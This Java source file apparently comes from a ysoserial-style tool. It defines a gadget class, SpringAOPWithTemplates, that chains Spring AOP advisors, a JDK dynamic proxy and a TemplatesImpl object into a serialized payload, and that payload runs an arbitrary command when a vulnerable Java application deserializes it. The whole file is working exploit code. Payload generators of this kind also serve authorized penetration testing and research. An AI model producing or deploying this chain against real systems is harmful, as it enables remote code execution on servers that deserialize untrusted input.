package com.h2tg.ysogate.payloads.gadgets;

import com.fasterxml.jackson.databind.introspect.AnnotatedConstructor;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.bullet.jdk.GBadAttr;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.PayloadRunner;
import com.h2tg.ysogate.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.springframework.aop.Advisor;
import org.springframework.aop.aspectj.AspectJAfterReturningAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor;
import org.springframework.aop.interceptor.ExposeInvocationInterceptor;
import org.springframework.aop.support.DefaultIntroductionAdvisor;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

@Dependencies({
        "org.springframework:spring-aop >= 4.3.0.RC1",
        "org.aspectj:aspectjweaver"
})
public class SpringAOPWithTemplates extends PayloadRunner implements CommandObjectPayload<Object>
{
    @Override
    public Object getObject(String cmd) throws Exception
    {
        Object template = Gadgets.createTemplates4Cmd(cmd);

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget("test");

        ExposeInvocationInterceptor exposeInvocationInterceptor = Reflections.createWithoutConstructor(ExposeInvocationInterceptor.class);
        Advisor advisor0 = new DefaultIntroductionAdvisor(exposeInvocationInterceptor);

        SingletonAspectInstanceFactory aspectInstanceFactory = new SingletonAspectInstanceFactory(template);
        AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice(TemplatesImpl.class.getMethod("newTransformer"), new AspectJExpressionPointcut(), aspectInstanceFactory);
        AfterReturningAdviceInterceptor adviceInterceptor = new AfterReturningAdviceInterceptor(advice);
        Advisor advisor = new DefaultIntroductionAdvisor(adviceInterceptor);

        advisedSupport.addAdvisor(advisor0);
        advisedSupport.addAdvisor(advisor);

        Constructor<?> constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Comparable proxy = (Comparable) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Comparable.class}, handler);

        GBadAttr gBadAttr = new GBadAttr();
        Object h = gBadAttr.readObjectToString(proxy);
        return h;
    }

    public static AspectJAfterReturningAdvice makeAdviceForConstructor(String classname) throws Exception
    {
        Constructor<?> constructor0 = Class.forName(classname).getDeclaredConstructor(String.class);
        AnnotatedConstructor annotatedConstructor = new AnnotatedConstructor(null, constructor0, null, null);

        SingletonAspectInstanceFactory aspectInstanceFactory = new SingletonAspectInstanceFactory(annotatedConstructor);
        AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice(AnnotatedConstructor.class.getMethod("call1", Object.class), new AspectJExpressionPointcut(), aspectInstanceFactory);
        advice.setArgumentNames("test");
        advice.setReturningName("test");
        return advice;
    }

    public static void main(final String[] args) throws Exception
    {
        PayloadRunner.run(SpringAOPWithTemplates.class, args);
    }
}
